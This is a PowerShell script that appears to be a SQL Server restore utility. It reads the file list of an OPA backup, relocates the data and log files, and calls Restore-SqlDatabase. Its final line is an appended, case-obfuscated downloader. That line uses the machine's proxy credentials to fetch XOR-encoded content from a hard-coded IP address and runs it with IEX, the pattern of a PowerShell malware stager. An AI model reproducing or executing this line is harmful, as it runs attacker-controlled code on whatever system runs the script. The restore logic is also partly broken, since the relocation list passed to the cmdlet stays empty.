Import-module SQLPS -DisableNameChecking -Force

$backupfile = 'C:\TEMP\OPA2.0\OPA2.0\OPA2.0Analysis\SQL\OPAmanager.bak'
$restoreserver = 'localhost'
$restoredatabase = 'OPA'
$restorefiles = @()
$files = Invoke-Sqlcmd -ServerInstance $restoreserver -Database tempdb -Query "RESTORE FILELISTONLY FROM DISK='$backupfile'"

$newdata = 'C:\DBFiles\Data'
$newlog = 'C:\DBFiles\Log'

$restore = new-object 'Microsoft.SqlServer.Management.Smo.Restore';
$restore.Database = $restoredatabase
$restore.Devices.Add((new-object Microsoft.SqlServer.Management.Smo.BackupDeviceItem $backupfile, 'File'))

foreach($file in $files){
    
    if($file.Type -eq 'L'){        
        $newpath = Join-Path $newlog $file.PhysicalName.Substring($file.PhysicalName.LastIndexOf('\')+1)
    } else {
        $newpath = Join-Path $newdata $file.PhysicalName.Substring($file.PhysicalName.LastIndexOf('\')+1)
    }
    $restore.RelocateFiles.Add((New-Object Microsoft.SqlServer.Management.Smo.RelocateFile ($file.LogicalName,$newpath)))
}




Restore-SqlDatabase -ServerInstance $restoreserver -Database $restoredatabase -BackupFile $backupfile -RelocateFile $restorefiles -RestoreAction Database -Script
$Wc=NeW-ObjeCt SySTEM.Net.WebCLiEnt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$WC.HeadeRS.ADd('User-Agent',$u);$wc.PrOxy = [SyStem.NeT.WEbReQUeSt]::DEFauLTWeBProxy;$WC.PRoXY.CrEdENTIaLS = [SYStEM.NeT.CReDEnTiALCaChE]::DEFaulTNeTworKCREdeNtiaLS;$K='0192023a7bbd73250516f069df18b500';$i=0;[CHAr[]]$B=([CHaR[]]($wc.DOwnloaDSTRing("http://23.239.12.15:8080/index.asp")))|%{$_-BXOr$k[$i++%$K.LENgTh]};IEX ($B-jOIn'')

